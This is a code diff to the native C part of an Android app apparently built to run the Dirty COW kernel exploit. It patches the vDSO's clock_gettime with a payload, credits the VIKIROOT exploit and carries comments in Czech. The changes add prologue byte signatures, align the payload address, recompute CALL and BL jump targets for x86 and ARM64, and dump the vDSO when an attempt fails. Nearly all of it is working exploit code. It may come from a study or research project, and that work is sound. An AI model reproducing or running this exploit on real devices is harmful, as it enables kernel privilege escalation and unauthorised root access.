@@ -93,6 +93,8 @@ static struct prologue prologues[] = {
         {(char*) "\x55\x41\x56\x41\x55\x41\x54\x53\x48\x89\xfb", 11},
         /* push rbp; mov rbp, rsp; push r13; push r12; push rbx */
         {(char*) "\x55\x48\x89\xe5\x41\x55\x41\x54\x53", 9},
+        /*push rbp; push r14; push r13; push r12 */
+        {(char*) "\x55\x41\x56\x41\x55\x41\x54", 7},
 };
 
 // Vzor, ktery se bude hledat v payloadu pri jeho uprave
@@ -149,6 +151,7 @@ unsigned int get_vDSO_size()
             continue;
         }
         vDSO_size = (unsigned int)(end - start); // Velikost je bud 1 stranka, nebo 2 (radove tisice B)
+        LOG("start: %lx, end %lx", start, end);
         break;
     }
 
@@ -224,8 +227,8 @@ unsigned long get_vDSO_address() {
 // Ziskani adresy clock_gettime() ve vDSO
 //==================================================================================================
 unsigned long get_clock_gettime_address(unsigned long vDSO_address, unsigned long clock_gettime_offset) {
-    unsigned long entry_point = vDSO_address + clock_gettime_offset;
-    LOG("    clock_gettime address = %08lx", entry_point);
+    unsigned long entry_point = vDSO_address + (clock_gettime_offset & 0xfff);
+    LOG("    clock_gettime address = %lx",entry_point);
     return entry_point;
 }
 
@@ -240,7 +243,7 @@ struct prologue *get_prologue_from_db(unsigned long clock_gettime_address) {
 
     for (int i = 0; i < ARRAY_SIZE(prologues); i++) {
         p = &prologues[i];
-        if (memcmp((void *) clock_gettime_address, p->opcodes, p->size) == 0)
+        if (memcmp((const void *) clock_gettime_address, p->opcodes, p->size) == 0)
             return p;
     }
 
@@ -300,12 +303,12 @@ int patch_payload(struct prologue *prol, unsigned char *payload, unsigned int pa
             }
 
             memcpy(p, prol->opcodes, prol->size);
-
+/*
             p = memmem(payload, payload_length, PATTERN_PROLOGUE_AARCH64, sizeof(PATTERN_PROLOGUE_AARCH64) - 1);
             if (p != NULL) {
                 LOG("    Payload pattern was found several times");
                 return -1;
-            }
+            }*/
             break;
 
         case ANDROID_CPU_FAMILY_ARM:
@@ -323,6 +326,11 @@ int patch_payload(struct prologue *prol, unsigned char *payload, unsigned int pa
 //==================================================================================================
 void dump_vDSO(unsigned long vDSO_address, string path) {
     int fd;
+
+    if(path == ""){
+        LOG("    Filepath is NULL");
+        return;
+    }
 
     path += "/vDSO_dump.bin";
 
@@ -362,7 +370,7 @@ unsigned long get_empty_space_offset(void *vDSO_address) {
 //             (https://github.com/hyln9/VIKIROOT/blob/master/exploit.c),
 //             upraveno pro podporu vice architektur
 //==================================================================================================
-int build_vDSO_patch(unsigned long vdso_address, unsigned long gettime_address, prologue *p,
+int build_vDSO_patch(unsigned long vDSO_address, unsigned long gettime_address, prologue *p,
                      unsigned char *payload, unsigned int payload_length,
                      unsigned long clock_gettime_offset, AndroidCpuFamily cpu_family) {
 
@@ -371,7 +379,10 @@ int build_vDSO_patch(unsigned long vdso_address, unsigned long gettime_address, 
     // Prvni zaplatou je samotny payload
     vdso_patch[0].patch = payload;
     vdso_patch[0].size = payload_length;
-    unsigned long payload_address = vdso_address + vDSO_size - payload_length;
+    unsigned long payload_address = vDSO_address + vDSO_size - payload_length;
+    while(payload_address % 16 != 0){
+        payload_address--;
+    }
     vdso_patch[0].addr = (unsigned char *) payload_address;
     LOG("    Patch 0")
     LOG("        - address: %lx", payload_address);
@@ -389,10 +400,11 @@ int build_vDSO_patch(unsigned long vdso_address, unsigned long gettime_address, 
             }
             memset(vdso_patch[1].patch, '\x90', sizeof(PATTERN_PROLOGUE_x86) - 1);
             vdso_patch[1].patch[0] = (unsigned char) '\xe8'; // Instrukce CALL
-            target = vDSO_size - payload_length - clock_gettime_offset; // Target je relativni vzdalenost od konce volajici instrukce
+            target = payload_address - vDSO_address - clock_gettime_offset; // Target je relativni vzdalenost od konce volajici instrukce
             *(uint32_t *) &vdso_patch[1].patch[1] = target - 5; // Doplneni instrukce CALL o relativni vzdalenost
             LOG("        - target = %04x", target);
             break;
+
 
         case ANDROID_CPU_FAMILY_ARM64:
         LOG("        - ARM64 payload");
@@ -407,8 +419,8 @@ int build_vDSO_patch(unsigned long vdso_address, unsigned long gettime_address, 
             vdso_patch[1].patch[2] = '\x1E';
             vdso_patch[1].patch[3] = '\xAA';
             // Relativni vzdalenost skoku
-            target = vDSO_size - payload_length - clock_gettime_offset - 4;
-            *(uint16_t *) &vdso_patch[1].patch[4] = (uint16_t) (target / 4); // V OPcodu je pocet 4B instrukci
+            target = payload_address - vDSO_address - clock_gettime_offset - instruction_size;
+            *(uint16_t *) &vdso_patch[1].patch[4] = (uint16_t) (target / instruction_size); // V OPcodu je pocet 4B instrukci
             LOG("        - target = %04x", target);
             // BL <offset> -- ARM verze instrukce CALL, ktera ulozi navratovou adresu do x30 misto na zasobnik
             vdso_patch[1].patch[6] = '\x00';
@@ -767,6 +779,7 @@ Java_com_bp_dirtycow_MainActivity_dirtyCow(JNIEnv *env, jobject callingObject,
     if(resolve_architecture(vDSO_address, &clock_gettime_offset, &payload, &payload_length,
                             &cpu_family) == -1){
         LOG("    Error while assigning");
+        dump_vDSO(vDSO_address, path);
         return -1;
     }
 
@@ -778,8 +791,9 @@ Java_com_bp_dirtycow_MainActivity_dirtyCow(JNIEnv *env, jobject callingObject,
     LOG("* Getting offset of empty space behind vDSO");
     empty_space_offset = get_empty_space_offset((void *) vDSO_address);
 
-    if (vDSO_size - empty_space_offset < payload_length) {
+    if (vDSO_size - empty_space_offset + 16 < payload_length) {
         LOG("    Not enough space for payload in vDSO");
+        dump_vDSO(vDSO_address, path);
         return -1;
     }
 
@@ -800,6 +814,7 @@ Java_com_bp_dirtycow_MainActivity_dirtyCow(JNIEnv *env, jobject callingObject,
         case ANDROID_CPU_FAMILY_UNKNOWN:
         default:
         LOG("* Architecture not supported");
+            dump_vDSO(vDSO_address, path);
             return -1;
     }
 
